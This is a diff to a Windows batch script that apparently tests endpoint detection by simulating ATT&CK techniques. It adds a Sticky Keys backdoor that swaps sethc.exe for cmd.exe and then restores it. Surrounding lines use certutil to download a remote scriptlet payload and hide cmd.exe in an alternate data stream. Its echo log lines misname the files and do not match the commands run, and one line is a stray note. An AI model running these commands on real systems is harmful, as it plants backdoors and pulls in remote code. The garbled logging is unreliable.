@@ -303,6 +303,22 @@ echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
 echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
 timeout 5
 
+echo %time% %date% [+] T1015 - Sethc replacement
+copy /Y C:\windows\system32\sethc.exe C:\windows\system32\sethc.bac
+copy /Y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
+copy /Y C:\windows\system32\sethc.bac C:\windows\system32\sethc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\windows\system32\setsh.exe C:\windows\system32\setsh.bac
+echo Command Excuted: C:\windows\system32\cmd.exe C:\windows\system32\setsh.exe
+echo Command Excuted: C:\windows\system32\setsh.bac C:\windows\system32\setsh.exe
+
+timeout 5
+
+
+T1129 (application manifest)
+
+
+
 echo **********************************************
 echo *      Testing LOLBAS PAYLOADS               *
 echo **********************************************
